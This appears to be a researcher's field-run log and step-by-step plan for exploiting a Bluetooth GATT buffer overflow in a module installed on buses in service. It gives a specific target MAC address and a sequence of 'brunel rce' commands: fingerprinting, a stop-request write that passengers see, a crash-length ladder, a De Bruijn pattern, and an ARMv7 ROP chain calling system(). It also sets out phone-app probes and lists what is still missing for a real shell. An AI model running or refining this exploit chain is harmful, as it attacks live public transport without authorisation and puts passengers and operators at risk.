# Field run for the line 11 action overflow

[English](rce-field-run-2026-11-07.md) · [Deutsch](../de/rce-field-run-2026-11-07.md)

Date: 7 November 2026
Target: `78:C4:0E:C0:2B:D7`, profile `p-8eef9540`, BlueZ 5.78
Status: the client can now deliver the 512-byte action. Real target addresses are still unknown.
Next: [phase 2 plan](rce-phase-2-plan-2026-11-07.md).

## Short version

My earlier action failures were a client defect, not a target verdict. The
Android app called `writeCharacteristic` and threw away the numeric status. The
target characteristic is `PROPERTY_WRITE`, so the writes should reach the bus.
The bench also reused cached service objects across disconnects, which can
return `ERROR_GATT_WRITE_REQUEST_BUSY` (201).

The client now does four things:

- logs the numeric status instead of a generic rejection,
- reconnects once on status 201 and clears the stale GATT cache,
- negotiates MTU 517 and can send a 512-byte write command,
- has a prepare-write fallback for a small MTU.

In the lab I proved the full path against BlueZ 5.78 and a 256-byte handler: an
over-the-air action write overwrites the saved return address and runs
`system("echo PWNED-GATT")`. The lab sends a 512-byte write command at MTU 517.
The fallback sends prepare writes in MTU-sized chunks, then `Execute Write`.

Tomorrow my first goal is a measured answer to three questions:

1. Does the target accept a 1-byte action write at all?
2. Does it accept 512 bytes?
3. At which value length does the target stop advertising?

The first crashing length is the offset to the overwritten control data. That
number is what my chain needs. Do not guess offsets before the ladder.

The characteristic has property `0x08` (write with response), but BlueZ checks
the write permission, not the ATT opcode. A write command reaches the same
handler. Use `--mtu 0` to skip MTU negotiation if it disturbs the target.

## What changed

| Path | Change |
|---|---|
| `research/brunel/rce.py` | MTU negotiation, write command, prepare fallback, length ladder, corrected ARM pointers, optional global command address |
| `research/brunel/transport.py` | ATT response capture at the L2CAP fixed channel, raw command send, MTU request |
| `research/brunel/cli.py` | `--write-mode`, `--mtu`, `--ladder`, `--hello`, `--no-leak`, `--command-addr`, `--align-ret` |
| `research/tests/test_rce.py` | delivery framing, ladder, ARM gadget variants |
| `exploit/.../BenchEngine.kt` | numeric write status, busy retry, cache reset, no-response writes, `action_long`, `action_ladder` |
| `lab/action_target.py` | end-to-end Bumble GATT server with a vulnerable C handler |
| `lab/harness/action_vuln.c` | 256-byte handler, `pop rdi; ret`, global command |
| `lab/scripts/action-e2e.sh` | command and prepare write proof over two virtual controllers |
| `lab/scripts/action-rop.sh` | x86-64 and ARMv7 chain proofs under qemu |

## Run order on the bus

Use the laptop with the ASUS adapter for the control run. It gives raw ATT, MTU
control, and the exact timing my chain needs. The phone records and observes.

```sh
cd /mnt/storage/t3/projects/brunel-research/research
sudo scripts/setup-radio.sh   # once after replug, or run as root
```

### 1. Fingerprint only

```sh
sudo .venv/bin/brunel rce --transport usb:0 --scan-seconds 25 --no-leak --dry-run
```

Confirm the address, the name `BlueZ 5.78`, and profile `p-8eef9540`. If the
address changed, use the new one.

### 2. Prove the write path with one byte

```sh
sudo .venv/bin/brunel rce --transport usb:0 --address 78:C4:0E:C0:2B:D7 \
  --no-leak --hello --write-mode command --scan-seconds 25 \
  --settle 1.5 --recovery 20
```

The `hello` stage sends action `0x01`, a stop request. A passenger sees the
request. Treat this as a change of state.

If `hello` fails, stop and record the status. Do not continue to the overflow.

### 3. Find the crash length

```sh
sudo .venv/bin/brunel rce --transport usb:0 --address 78:C4:0E:C0:2B:D7 \
  --no-leak --ladder --write-mode prepare --scan-seconds 25 \
  --settle 1.5 --recovery 25 --out ladder.json
```

The ladder sends `41` fill at 1, 4, 8, and so on up to 512. It stops at the first
length that makes the target stop advertising. That length is the offset to the
first overwritten control word, or the offset to a stack canary.

If the ladder reaches 512 without a crash, the app does not copy into a fixed
stack buffer, or it bounds the copy. Then the next test is the 512-byte De Bruijn
run and the app-level `action_long` probe.

### 4. 512-byte De Bruijn

```sh
sudo .venv/bin/brunel rce --transport usb:0 --address 78:C4:0E:C0:2B:D7 \
  --no-leak --write-mode prepare --scan-seconds 25 \
  --settle 1.5 --recovery 25 --out pattern.json
```

Use `prepare` when MTU negotiation does not reach 517. Use `command` when the
`hello` stage already worked and the negotiated MTU is 517.

### 5. Attempt a chain only after the ladder

Set the offset to the first crashing length. Start with a harmless command.

```sh
sudo .venv/bin/brunel rce --transport usb:0 --address 78:C4:0E:C0:2B:D7 \
  --no-leak --profile armv7 --offset 260 --gadget-words 3 \
  --system 0x00000000 --gadget 0x00000000 --cmd 'echo pwn' --scan-seconds 25
```

With zero addresses the builder still sends the De Bruijn pattern, so a zero
address run is the crash test.

## What the phone app must do

If the laptop is not available, run the same order from the app. Use these
probes, in this order:

| Order | Probe | Purpose |
|---:|---|---|
| 1 | `fingerprint` | address and version |
| 2 | `gatt_enum` | confirm service `0x1f1f`, characteristic `0x1f20`, property `0x08` |
| 3 | `att_mtu` | confirm 517 |
| 4 | `action_known` | one-byte writes, numeric status |
| 5 | `action_ladder` | first crashing length |
| 6 | `action_long` | 512-byte De Bruijn |

The app must log these values for every write:

- `writeCharacteristic` return code (integer, not a boolean),
- characteristic properties and handle,
- MTU at the time of the write,
- connection state and `operationId`,
- the exact value length, and the first 32 bytes in hex,
- time between the write and the next advertisement,
- service inventory before and after a suspected crash.

The app must connect fresh for each action probe. A cached service list after a
disconnect is what produced the 201 errors.

## Decision tree

```text
hello write fails
  -> record status, reconnect, retry once
  -> still fails: permission, encryption, or busy. Capture and stop.

hello write succeeds, ladder reaches 512 without a crash
  -> no stack overflow on the action path. Capture the status trail.
  -> try write requests and write commands separately in the matrix.

ladder crashes at length L
  -> L is the first overwritten word or the canary.
  -> if the app recovers, send De Bruijn at 512 and keep the crash length.
  -> if the app does not recover, the module may need a power cycle.

512-byte write delivered, no crash
  -> the handler discards the tail or bounds the copy.
  -> try the prepare path with offsets, then the matrix.
```

## Evidence to capture

- The JSON result file from every run.
- The phone capture with `advertisement`, `gatt_read`, and `gatt_write` events.
- The exact crash length and the recovery time.
- The service inventory after recovery. If `0x1f20` is gone and `0x2020` still
  answers, the app died and `bluetoothd` survived. If all services are gone, the
  daemon or the controller dropped.
- An HCI snoop log from the phone and, when possible, `btmon` on the laptop.
- The advertised name after a crash. If it changes to spaces, the EIR path and the
  action path share a stack.

## Safety

- `0x01` is a stop request. Send it once at the start, not in a loop.
- A 512-byte crash drops Bluetooth for that vehicle until the app restarts.
- Do not run the ladder on a bus that is about to reach the passenger stop.
- Keep the phone capture running so a negative result still yields data.

## Additional evidence that helps

- Photograph the module label, model, serial, and any exposed port. The OUI is
  `78:C4:0E` (H&D Wireless), but the label may name the carrier board and CPU.
- Capture the GATT database hash and the Client Supported Features value before
  any write. They identify the BlueZ build and the cache state.
- If a module is ever available on a bench, dump `/proc/self/maps`, the action
  app binary, and `libc` first. That answers every address question at once.
- Keep one untouched control bus and one test bus in the same run when possible.

## What is still missing for a real shell

- The buffer offset. The ladder measures it.
- A stack canary value if the build uses `-fstack-protector`.
- The libc base, `system`, and a `pop {r0, ...}` gadget. On a 32-bit ARM build
  these need a firmware dump, a memory leak, or a brute-force run over the
  libc page offset.
- The process user. A crash in a vendor app is not a `bluetoothd` crash and not
  root. Check whether the action app survives independently.

Do not claim a shell from a crash. A crash plus a recovered service is a
reachable overflow. It becomes RCE when the chain lands and the command runs.

## Lab reproduction

The same code path runs offline without radio permissions:

```sh
lab/scripts/action-e2e.sh
lab/scripts/action-rop.sh
```

`action-e2e.sh` starts two linked virtual controllers, runs the Bumble target
with the vulnerable handler, sends the real ATT request from `brunel rce`, and
checks the target output for `PWNED-GATT`. It passes with `--write-mode command`
and with `--write-mode prepare`.
